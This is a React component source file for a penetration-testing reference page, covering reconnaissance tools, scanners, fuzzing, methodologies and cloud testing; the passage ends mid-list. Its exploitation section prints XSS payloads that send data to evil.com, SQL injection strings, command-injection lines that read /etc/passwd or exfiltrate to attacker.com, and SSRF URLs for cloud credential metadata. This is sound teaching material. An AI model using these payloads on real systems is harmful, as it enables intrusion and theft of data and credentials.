
import React from 'react';
import { Card } from '@/components/ui/card';
import { Accordion, AccordionItem, AccordionTrigger, AccordionContent } from '@/components/ui/accordion';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Search, Shield, Code, Database, Globe, FileSearch, Zap, Bug } from 'lucide-react';

const AdvancedContentSection: React.FC = () => {
  return (
    <div className="space-y-8">
      <div className="text-center mb-8">
        <h2 className="text-3xl font-bold text-cybr-primary mb-4">
          Advanced Web Penetration Testing
        </h2>
        <p className="text-lg opacity-80 max-w-4xl mx-auto">
          The most comprehensive web penetration testing resource covering advanced reconnaissance, 
          exploitation techniques, modern web technologies, and professional methodologies.
        </p>
      </div>

      <Accordion type="multiple" className="space-y-4">
        {/* Advanced Reconnaissance */}
        <AccordionItem value="advanced-recon">
          <AccordionTrigger className="text-xl font-semibold flex items-center gap-2">
            <Search className="h-6 w-6 text-cybr-primary" />
            Advanced Reconnaissance & Information Gathering
          </AccordionTrigger>
          <AccordionContent>
            <div className="space-y-6">
              {/* OSINT Techniques */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4 flex items-center gap-2">
                  <Globe className="h-5 w-5" />
                  OSINT (Open Source Intelligence) Techniques
                </h4>
                <div className="space-y-4">
                  <div>
                    <h5 className="font-medium mb-2">Essential OSINT Tools (25+ Tools)</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="bg-cybr-muted/20 p-4 rounded-lg">
                        <h6 className="font-medium text-cybr-primary mb-2">Search Engine Tools</h6>
                        <ul className="space-y-1 text-sm">
                          <li><Badge variant="outline">Google Dorking</Badge> - Advanced search operators</li>
                          <li><Badge variant="outline">Shodan</Badge> - Internet-connected device search</li>
                          <li><Badge variant="outline">Censys</Badge> - Internet scanning and analysis</li>
                          <li><Badge variant="outline">ZoomEye</Badge> - Cyberspace search engine</li>
                        </ul>
                      </div>
                      <div className="bg-cybr-muted/20 p-4 rounded-lg">
                        <h6 className="font-medium text-cybr-primary mb-2">Social Media Intelligence</h6>
                        <ul className="space-y-1 text-sm">
                          <li><Badge variant="outline">Sherlock</Badge> - Username enumeration</li>
                          <li><Badge variant="outline">Social Mapper</Badge> - Social media correlation</li>
                          <li><Badge variant="outline">Twint</Badge> - Twitter OSINT</li>
                          <li><Badge variant="outline">Maltego</Badge> - Link analysis platform</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  
                  <Separator />
                  
                  <div>
                    <h5 className="font-medium mb-3">Google Dorking Examples (50+ Techniques)</h5>
                    <div className="bg-black/40 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div className="text-cybr-primary"># Administrative Interfaces</div>
                      <div>site:example.com inurl:admin</div>
                      <div>site:example.com inurl:login</div>
                      <div>site:example.com intitle:"admin panel"</div>
                      <div className="text-cybr-primary mt-3"># Configuration Files</div>
                      <div>site:example.com filetype:xml | filetype:conf</div>
                      <div>site:example.com ext:cfg | ext:env</div>
                      <div className="text-cybr-primary mt-3"># Database Files</div>
                      <div>site:example.com filetype:sql | filetype:dbf</div>
                      <div>site:example.com "phpMyAdmin" "running on"</div>
                      <div className="text-cybr-primary mt-3"># Sensitive Information</div>
                      <div>site:example.com "password" | "passwd"</div>
                      <div>site:example.com "api_key" | "secret_key"</div>
                    </div>
                  </div>
                </div>
              </Card>

              {/* Subdomain Enumeration */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Subdomain Enumeration Techniques</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <h5 className="font-medium mb-2 text-cybr-primary">Active Enumeration Tools</h5>
                    <ul className="space-y-2 text-sm">
                      <li><strong>Amass:</strong> Advanced DNS enumeration with multiple data sources</li>
                      <li><strong>Subfinder:</strong> High-speed passive subdomain discovery</li>
                      <li><strong>Assetfinder:</strong> Fast asset discovery with minimal false positives</li>
                      <li><strong>Sublist3r:</strong> Multi-source enumeration tool</li>
                      <li><strong>DNSRecon:</strong> Comprehensive DNS enumeration</li>
                    </ul>
                  </div>
                  <div>
                    <h5 className="font-medium mb-2 text-cybr-primary">Passive Techniques</h5>
                    <ul className="space-y-2 text-sm">
                      <li><strong>Certificate Transparency:</strong> crt.sh, censys.io analysis</li>
                      <li><strong>DNS Aggregators:</strong> SecurityTrails, Passivetotal</li>
                      <li><strong>Archive Analysis:</strong> Wayback Machine historical data</li>
                      <li><strong>Code Repository Mining:</strong> GitHub, GitLab searches</li>
                      <li><strong>Public Dataset Analysis:</strong> Common Crawl data</li>
                    </ul>
                  </div>
                </div>
              </Card>

              {/* Technology Stack Identification */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Technology Stack Identification</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div className="bg-cybr-muted/20 p-3 rounded">
                      <h6 className="font-medium text-cybr-primary">Detection Tools</h6>
                      <ul className="text-sm space-y-1 mt-2">
                        <li>Wappalyzer</li>
                        <li>BuiltWith</li>
                        <li>WhatWeb</li>
                        <li>Retire.js</li>
                        <li>Nikto</li>
                      </ul>
                    </div>
                    <div className="bg-cybr-muted/20 p-3 rounded">
                      <h6 className="font-medium text-cybr-primary">Fingerprinting</h6>
                      <ul className="text-sm space-y-1 mt-2">
                        <li>HTTP Headers</li>
                        <li>Response Bodies</li>
                        <li>Cookie Analysis</li>
                        <li>JavaScript Frameworks</li>
                        <li>CSS Frameworks</li>
                      </ul>
                    </div>
                    <div className="bg-cybr-muted/20 p-3 rounded">
                      <h6 className="font-medium text-cybr-primary">Advanced Techniques</h6>
                      <ul className="text-sm space-y-1 mt-2">
                        <li>SSL Certificate Analysis</li>
                        <li>Favicon Fingerprinting</li>
                        <li>Meta Tag Analysis</li>
                        <li>Font Detection</li>
                        <li>CDN Identification</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Vulnerability Assessment */}
        <AccordionItem value="vuln-assessment">
          <AccordionTrigger className="text-xl font-semibold flex items-center gap-2">
            <Bug className="h-6 w-6 text-cybr-primary" />
            Comprehensive Vulnerability Assessment
          </AccordionTrigger>
          <AccordionContent>
            <div className="space-y-6">
              {/* Automated Scanning */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Automated Scanning Tools</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">Burp Suite Professional</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Scanner Configuration:</strong> Active vs passive scanning</li>
                        <li><strong>Intruder Usage:</strong> Sniper, battering ram, pitchfork attacks</li>
                        <li><strong>Extensions:</strong> BApp Store, custom development</li>
                        <li><strong>Collaborator:</strong> Out-of-band vulnerability detection</li>
                        <li><strong>Professional Features:</strong> Authenticated scanning</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">OWASP ZAP</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Automated Scanning:</strong> Spider and active scan policies</li>
                        <li><strong>Authentication:</strong> Form-based, HTTP-based auth</li>
                        <li><strong>Scripting Engine:</strong> JavaScript automation</li>
                        <li><strong>API Integration:</strong> REST API for CI/CD</li>
                        <li><strong>Add-ons:</strong> Marketplace extensions</li>
                      </ul>
                    </div>
                  </div>
                  
                  <Separator />
                  
                  <div>
                    <h5 className="font-medium mb-3">Additional Enterprise Tools</h5>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <strong>Commercial</strong>
                        <ul className="text-sm mt-2 space-y-1">
                          <li>Acunetix - $4,500+/year</li>
                          <li>Nessus Professional - $3,990/year</li>
                          <li>Qualys VMDR - $2,995+/year</li>
                          <li>Rapid7 InsightAppSec - $12,000+/year</li>
                        </ul>
                      </div>
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <strong>Open Source</strong>
                        <ul className="text-sm mt-2 space-y-1">
                          <li>Nikto - Web server scanner</li>
                          <li>Nuclei - YAML-based scanner</li>
                          <li>OpenVAS - Vulnerability management</li>
                          <li>W3AF - Web application framework</li>
                        </ul>
                      </div>
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <strong>Specialized</strong>
                        <ul className="text-sm mt-2 space-y-1">
                          <li>SQLMap - SQL injection testing</li>
                          <li>XSStrike - XSS detection</li>
                          <li>Commix - Command injection</li>
                          <li>NoSQLMap - NoSQL injection</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </Card>

              {/* Advanced Fuzzing */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Advanced Fuzzing Techniques</h4>
                <div className="space-y-4">
                  <div>
                    <h5 className="font-medium mb-2">Parameter Fuzzing Methodologies</h5>
                    <ul className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm">
                      <li>• Input Validation Testing</li>
                      <li>• Business Logic Fuzzing</li>
                      <li>• Authentication Fuzzing</li>
                      <li>• Authorization Fuzzing</li>
                      <li>• Session Management Fuzzing</li>
                      <li>• File Upload Fuzzing</li>
                      <li>• HTTP Method Fuzzing</li>
                      <li>• Header Fuzzing</li>
                    </ul>
                  </div>
                  
                  <div>
                    <h5 className="font-medium mb-2">Advanced Fuzzing Tools</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <strong className="text-cybr-primary">Web Fuzzers</strong>
                        <ul className="text-sm mt-1 space-y-1">
                          <li>FFuF - Fast web fuzzer</li>
                          <li>Wfuzz - Python-based fuzzing</li>
                          <li>Burp Intruder - Professional fuzzing</li>
                          <li>OWASP ZAP Fuzzer - Integrated fuzzing</li>
                        </ul>
                      </div>
                      <div>
                        <strong className="text-cybr-primary">Binary Fuzzers</strong>
                        <ul className="text-sm mt-1 space-y-1">
                          <li>AFL - Coverage-guided fuzzing</li>
                          <li>Radamsa - Test case generator</li>
                          <li>Peach - Platform fuzzer</li>
                          <li>Sulley - Network protocol fuzzer</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Exploitation Techniques */}
        <AccordionItem value="exploitation">
          <AccordionTrigger className="text-xl font-semibold flex items-center gap-2">
            <Code className="h-6 w-6 text-cybr-primary" />
            Advanced Exploitation Techniques
          </AccordionTrigger>
          <AccordionContent>
            <div className="space-y-6">
              {/* Payload Crafting */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Payload Crafting Mastery</h4>
                <div className="space-y-4">
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">XSS Payload Development (100+ Examples)</h5>
                    <div className="bg-black/40 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div className="text-green-400">{`// Basic XSS Payloads`}</div>
                      <div>{`<script>alert('XSS')</script>`}</div>
                      <div>{`<img src=x onerror=alert('XSS')>`}</div>
                      <div>{`<svg onload=alert('XSS')>`}</div>
                      <div className="text-green-400 mt-3">{`// Filter Bypass Techniques`}</div>
                      <div>{`<ScRiPt>alert('XSS')</ScRiPt>`}</div>
                      <div>{`<script>alert(String.fromCharCode(88,83,83))</script>`}</div>
                      <div>{`<script>alert\`XSS\`</script>`}</div>
                      <div className="text-green-400 mt-3">{`// Advanced Techniques`}</div>
                      <div>{`<script>fetch('/api/data').then(r=>r.text()).then(d=>location='//evil.com/?'+d)</script>`}</div>
                      <div>{`<script>navigator.sendBeacon('//evil.com', new FormData(document.forms[0]))</script>`}</div>
                    </div>
                  </div>
                  
                  <Separator />
                  
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">SQL Injection Mastery (200+ Techniques)</h5>
                    <div className="bg-black/40 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div className="text-blue-400">{`-- Union-based Injection`}</div>
                      <div>{`' UNION SELECT 1,2,3,4,5--`}</div>
                      <div>{`' UNION SELECT @@version,NULL,NULL--`}</div>
                      <div className="text-blue-400 mt-3">{`-- Boolean-based Blind Injection`}</div>
                      <div>{`' AND LENGTH(database())>5--`}</div>
                      <div>{`' AND SUBSTR(database(),1,1)='a'--`}</div>
                      <div className="text-blue-400 mt-3">{`-- Time-based Blind Injection`}</div>
                      <div>{`'; WAITFOR DELAY '00:00:05'--`}</div>
                      <div>{`' AND SLEEP(5)--`}</div>
                      <div className="text-blue-400 mt-3">{`-- Advanced WAF Bypass`}</div>
                      <div>{`/*!50000SELECT*/ * FROM users`}</div>
                      <div>{`/**/UNION/**/SELECT/**/`}</div>
                    </div>
                  </div>
                  
                  <Separator />
                  
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Command Injection Techniques</h5>
                    <div className="bg-black/40 p-4 rounded-lg font-mono text-sm space-y-2">
                      <div className="text-yellow-400">{`# Basic Command Injection`}</div>
                      <div>{`; ls -la`}</div>
                      <div>{`| whoami`}</div>
                      <div>{`&& cat /etc/passwd`}</div>
                      <div className="text-yellow-400 mt-3">{`# Advanced Bypass Techniques`}</div>
                      <div>{`; w'h'o'a'm'i`}</div>
                      <div>{`; who$IFS$()ami`}</div>
                      <div>{`; echo "d2hvYW1p" | base64 -d | sh`}</div>
                      <div className="text-yellow-400 mt-3">{`# Blind Command Injection`}</div>
                      <div>{`; sleep 5`}</div>
                      <div>{`; curl http://attacker.com/$(whoami)`}</div>
                      <div>{`; nslookup $(whoami).attacker.com`}</div>
                    </div>
                  </div>
                </div>
              </Card>

              {/* Advanced Attack Vectors */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Modern Attack Vectors</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">SSRF (Server-Side Request Forgery)</h5>
                    <div className="bg-cybr-muted/20 p-3 rounded text-sm">
                      <strong>Cloud Metadata Attacks:</strong>
                      <ul className="mt-2 space-y-1">
                        <li>AWS: http://169.254.169.254/latest/meta-data/</li>
                        <li>Google: http://metadata.google.internal/</li>
                        <li>Azure: http://169.254.169.254/metadata/</li>
                      </ul>
                      <strong className="block mt-3">Protocol Smuggling:</strong>
                      <ul className="mt-2 space-y-1">
                        <li>gopher://127.0.0.1:25/_MAIL</li>
                        <li>dict://127.0.0.1:11211/stats</li>
                        <li>ftp://127.0.0.1/</li>
                      </ul>
                    </div>
                  </div>
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Deserialization Attacks</h5>
                    <div className="bg-cybr-muted/20 p-3 rounded text-sm">
                      <strong>Multi-Language Support:</strong>
                      <ul className="mt-2 space-y-1">
                        <li>Java: ysoserial payloads</li>
                        <li>.NET: BinaryFormatter exploitation</li>
                        <li>Python: Pickle deserialization</li>
                        <li>PHP: Unserialize vulnerabilities</li>
                      </ul>
                      <strong className="block mt-3">Advanced Techniques:</strong>
                      <ul className="mt-2 space-y-1">
                        <li>Gadget chain construction</li>
                        <li>Custom payload development</li>
                        <li>Bypass serialization filters</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Modern Web Technologies */}
        <AccordionItem value="modern-web">
          <AccordionTrigger className="text-xl font-semibold flex items-center gap-2">
            <Globe className="h-6 w-6 text-cybr-primary" />
            Modern Web Technologies Testing
          </AccordionTrigger>
          <AccordionContent>
            <div className="space-y-6">
              {/* SPA Security */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Single Page Applications (SPA) Security</h4>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <h5 className="font-medium text-cybr-primary mb-2">React Security</h5>
                    <ul className="text-sm space-y-1">
                      <li>• XSS in JSX rendering</li>
                      <li>• Dangerous props usage</li>
                      <li>• State management vulnerabilities</li>
                      <li>• Client-side routing bypass</li>
                      <li>• Component injection attacks</li>
                    </ul>
                  </div>
                  <div>
                    <h5 className="font-medium text-cybr-primary mb-2">Angular Security</h5>
                    <ul className="text-sm space-y-1">
                      <li>• Template injection in Angular</li>
                      <li>• Dependency injection attacks</li>
                      <li>• Service worker exploitation</li>
                      <li>• Route guard bypass</li>
                      <li>• DOM sanitization bypass</li>
                    </ul>
                  </div>
                  <div>
                    <h5 className="font-medium text-cybr-primary mb-2">Vue.js Security</h5>
                    <ul className="text-sm space-y-1">
                      <li>• Template injection vulnerabilities</li>
                      <li>• v-html XSS vectors</li>
                      <li>• Vuex state manipulation</li>
                      <li>• Component prop injection</li>
                      <li>• Server-side rendering issues</li>
                    </ul>
                  </div>
                </div>
              </Card>

              {/* API Security */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">API Security Testing</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">REST API Testing</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Endpoint Discovery:</strong> Hidden endpoints, version enumeration</li>
                        <li><strong>HTTP Method Testing:</strong> Verb tampering, method override</li>
                        <li><strong>Parameter Manipulation:</strong> Query, path, header injection</li>
                        <li><strong>Authentication Testing:</strong> Token manipulation, key management</li>
                        <li><strong>Rate Limiting:</strong> Threshold testing, bypass techniques</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">GraphQL Security</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Schema Discovery:</strong> Introspection queries, enumeration</li>
                        <li><strong>Query Complexity:</strong> Nested queries, resource exhaustion</li>
                        <li><strong>Authorization Testing:</strong> Field-level permissions</li>
                        <li><strong>Input Validation:</strong> Query injection, variable manipulation</li>
                        <li><strong>Batch Query Abuse:</strong> Multiple operations, timeouts</li>
                      </ul>
                    </div>
                  </div>
                  
                  <div className="bg-black/40 p-4 rounded-lg">
                    <h6 className="font-medium mb-2 text-cybr-primary">GraphQL Introspection Query Example</h6>
                    <pre className="text-sm text-green-400">{`query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}`}</pre>
                  </div>
                </div>
              </Card>

              {/* WebAssembly & PWA */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Emerging Technologies</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">WebAssembly (WASM) Security</h5>
                    <ul className="space-y-2 text-sm">
                      <li>• Memory corruption in WASM modules</li>
                      <li>• JavaScript-WASM bridge vulnerabilities</li>
                      <li>• Sandbox escape techniques</li>
                      <li>• Reverse engineering WASM binaries</li>
                      <li>• Side-channel attacks on WASM</li>
                    </ul>
                    <div className="mt-3 bg-cybr-muted/20 p-2 rounded text-xs">
                      <strong>Analysis Tools:</strong>
                      <ul className="mt-1">
                        <li>• wabt - WebAssembly Binary Toolkit</li>
                        <li>• wasm2c - WASM to C converter</li>
                        <li>• wasm-decompile - Decompilation tool</li>
                      </ul>
                    </div>
                  </div>
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Progressive Web Apps (PWA)</h5>
                    <ul className="space-y-2 text-sm">
                      <li>• Service worker exploitation</li>
                      <li>• Web app manifest manipulation</li>
                      <li>• Offline functionality abuse</li>
                      <li>• Push notification hijacking</li>
                      <li>• Cache poisoning attacks</li>
                    </ul>
                    <div className="mt-3 bg-cybr-muted/20 p-2 rounded text-xs">
                      <strong>Testing Techniques:</strong>
                      <ul className="mt-1">
                        <li>• Service worker interception</li>
                        <li>• Manifest file analysis</li>
                        <li>• Background sync exploitation</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Professional Testing */}
        <AccordionItem value="professional">
          <AccordionTrigger className="text-xl font-semibold flex items-center gap-2">
            <Shield className="h-6 w-6 text-cybr-primary" />
            Professional Testing Methodologies
          </AccordionTrigger>
          <AccordionContent>
            <div className="space-y-6">
              {/* OWASP Testing Guide */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">OWASP Testing Guide v4.2 Implementation</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">Information Gathering (WSTG-INFO)</h5>
                      <ul className="space-y-1 text-sm">
                        <li>01. Search Engine Discovery</li>
                        <li>02. Fingerprint Web Server</li>
                        <li>03. Review Webserver Metafiles</li>
                        <li>04. Enumerate Applications</li>
                        <li>05. Review Webpage Content</li>
                        <li>06. Identify Entry Points</li>
                        <li>07. Map Execution Paths</li>
                        <li>08. Fingerprint Framework</li>
                        <li>09. Fingerprint Application</li>
                        <li>10. Map Architecture</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">Configuration Testing (WSTG-CONFIG)</h5>
                      <ul className="space-y-1 text-sm">
                        <li>01. Network Infrastructure</li>
                        <li>02. Application Platform</li>
                        <li>03. File Extensions Handling</li>
                        <li>04. Backup and Unreferenced Files</li>
                        <li>05. Admin Interfaces</li>
                        <li>06. HTTP Methods</li>
                        <li>07. HTTP Strict Transport Security</li>
                        <li>08. Cross Domain Policy</li>
                        <li>09. File Permission</li>
                        <li>10. Subdomain Takeover</li>
                        <li>11. Cloud Storage</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </Card>

              {/* PTES Framework */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">PTES (Penetration Testing Execution Standard)</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Testing Phases</h5>
                    <ol className="space-y-2 text-sm">
                      <li><strong>1. Pre-engagement:</strong> Scoping, legal documentation</li>
                      <li><strong>2. Intelligence Gathering:</strong> OSINT, footprinting</li>
                      <li><strong>3. Threat Modeling:</strong> Attack surface analysis</li>
                      <li><strong>4. Vulnerability Analysis:</strong> Automated and manual testing</li>
                      <li><strong>5. Exploitation:</strong> Initial compromise, escalation</li>
                      <li><strong>6. Post-Exploitation:</strong> Network mapping, data collection</li>
                      <li><strong>7. Reporting:</strong> Technical and executive documentation</li>
                    </ol>
                  </div>
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Deliverables</h5>
                    <ul className="space-y-2 text-sm">
                      <li><strong>Executive Summary:</strong> High-level findings, business risk</li>
                      <li><strong>Technical Details:</strong> Vulnerability specifics, exploitation</li>
                      <li><strong>Evidence Documentation:</strong> Screenshots, logs, PoC</li>
                      <li><strong>Risk Prioritization:</strong> CVSS scoring, business impact</li>
                      <li><strong>Remediation Roadmap:</strong> Fix prioritization, timeline</li>
                      <li><strong>Strategic Recommendations:</strong> Security program improvements</li>
                    </ul>
                  </div>
                </div>
              </Card>

              {/* OSSTMM Methodology */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">OSSTMM Scientific Approach</h4>
                <div className="space-y-4">
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Testing Channels</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <strong>Human Security</strong>
                        <ul className="text-sm mt-2 space-y-1">
                          <li>• Social engineering</li>
                          <li>• Personnel security</li>
                          <li>• Training effectiveness</li>
                        </ul>
                      </div>
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <strong>Physical Security</strong>
                        <ul className="text-sm mt-2 space-y-1">
                          <li>• Perimeter security</li>
                          <li>• Building security</li>
                          <li>• Asset protection</li>
                        </ul>
                      </div>
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <strong>Data Networks</strong>
                        <ul className="text-sm mt-2 space-y-1">
                          <li>• Network architecture</li>
                          <li>• Protocol security</li>
                          <li>• Intrusion detection</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Cloud Security */}
        <AccordionItem value="cloud-security">
          <AccordionTrigger className="text-xl font-semibold flex items-center gap-2">
            <Database className="h-6 w-6 text-cybr-primary" />
            Cloud Security Testing
          </AccordionTrigger>
          <AccordionContent>
            <div className="space-y-6">
              {/* AWS Security */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">AWS Security Assessment</h4>
                <div className="space-y-4">
                  <div className="bg-black/40 p-4 rounded-lg font-mono text-sm">
                    <div className="text-cybr-primary mb-2"># AWS Service Discovery</div>
                    <div className="space-y-1">
                      <div>{`# S3 Bucket Enumeration`}</div>
                      <div>{`aws s3 ls s3://company-name`}</div>
                      <div>{`aws s3 ls s3://company-backup`}</div>
                      <div>{`bucket_finder.rb wordlist.txt`}</div>
                      <div className="mt-2">{`# EC2 Instance Metadata`}</div>
                      <div>{`curl http://169.254.169.254/latest/meta-data/`}</div>
                      <div>{`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`}</div>
                      <div className="mt-2">{`# Lambda Function Discovery`}</div>
                      <div>{`aws lambda list-functions`}</div>
                      <div>{`aws lambda get-function --function-name function-name`}</div>
                    </div>
                  </div>
                  
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">AWS Security Tools</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <ul className="space-y-2 text-sm">
                          <li><strong>ScoutSuite:</strong> Multi-cloud security auditing</li>
                          <li><strong>Prowler:</strong> AWS security assessment tool</li>
                          <li><strong>Pacu:</strong> AWS exploitation framework</li>
                          <li><strong>CloudMapper:</strong> Environment visualization</li>
                        </ul>
                      </div>
                      <div>
                        <ul className="space-y-2 text-sm">
                          <li><strong>S3Scanner:</strong> S3 bucket discovery</li>
                          <li><strong>Cloud_enum:</strong> Multi-cloud enumeration</li>
                          <li><strong>WeirdAAL:</strong> AWS attack library</li>
                          <li><strong>Enumerate-IAM:</strong> IAM privilege enumeration</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Common AWS Misconfigurations</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                      <div>
                        <strong>S3 Security Issues:</strong>
                        <ul className="mt-1 space-y-1">
                          <li>• Public read/write permissions</li>
                          <li>• Bucket policy misconfigurations</li>
                          <li>• Server-side encryption disabled</li>
                          <li>• Logging and monitoring gaps</li>
                        </ul>
                      </div>
                      <div>
                        <strong>IAM Weaknesses:</strong>
                        <ul className="mt-1 space-y-1">
                          <li>• Overprivileged policies</li>
                          <li>• Wildcard permissions (*)</li>
                          <li>• Root account usage</li>
                          <li>• Access key exposure</li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>
              </Card>

              {/* Azure & GCP */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Azure & GCP Security Testing</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">Azure Security Tools</h5>
                    <ul className="space-y-2 text-sm">
                      <li><strong>ROADtools:</strong> Azure AD reconnaissance</li>
                      <li><strong>PowerZure:</strong> Azure exploitation toolkit</li>
                      <li><strong>Stormspotter:</strong> Azure Red Team tool</li>
                      <li><strong>MicroBurst:</strong> Azure security assessment</li>
                      <li><strong>AADInternals:</strong> Azure AD exploitation</li>
                    </ul>
                    <div className="mt-3 bg-black/30 p-3 rounded font-mono text-xs">
                      <div>{`# Azure Enumeration`}</div>
                      <div>{`Get-AzureADUser`}</div>
                      <div>{`Get-AzStorageAccount`}</div>
                      <div>{`Get-AzKeyVault`}</div>
                    </div>
                  </div>
                  <div>
                    <h5 className="font-medium mb-3 text-cybr-primary">GCP Security Tools</h5>
                    <ul className="space-y-2 text-sm">
                      <li><strong>G-Scout:</strong> GCP security assessment</li>
                      <li><strong>GCP Bucket Brute:</strong> Storage enumeration</li>
                      <li><strong>Cloud Security Scanner:</strong> Automated scanning</li>
                      <li><strong>GCP Firewall Analyzer:</strong> Network security</li>
                      <li><strong>IAM Recommender:</strong> Permission analysis</li>
                    </ul>
                    <div className="mt-3 bg-black/30 p-3 rounded font-mono text-xs">
                      <div>{`# GCP Discovery`}</div>
                      <div>{`gcloud projects list`}</div>
                      <div>{`gcloud storage buckets list`}</div>
                      <div>{`gcloud iam roles list`}</div>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Mobile & IoT */}
        <AccordionItem value="mobile-iot">
          <AccordionTrigger className="text-xl font-semibold flex items-center gap-2">
            <Zap className="h-6 w-6 text-cybr-primary" />
            Mobile & IoT Security Testing
          </AccordionTrigger>
          <AccordionContent>
            <div className="space-y-6">
              {/* Mobile Web Security */}
              <Card className="p-6">
                <h4 className="text-lg font-semibold mb-4">Mobile Web Application Testing</h4>
                <div className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">Mobile-Specific Vulnerabilities</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>Touch Interface:</strong> Tap jacking, UI redressing</li>
                        <li><strong>Browser Security:</strong> Mobile Safari, Chrome Mobile flaws</li>
                        <li><strong>Responsive Design:</strong> Hidden functionality, CSS bypass</li>
                        <li><strong>PWA Security:</strong> Service worker exploitation</li>
                        <li><strong>WebView Issues:</strong> JavaScript bridge vulnerabilities</li>
                      </ul>
                    </div>
                    <div>
                      <h5 className="font-medium mb-3 text-cybr-primary">Mobile Testing Tools</h5>
                      <ul className="space-y-2 text-sm">
                        <li><strong>MobSF:</strong> Mobile Security Framework</li>
                        <li><strong>QARK:</strong> Quick Android Review Kit</li>
                        <li><strong>Needle:</strong> iOS Security Framework</li>
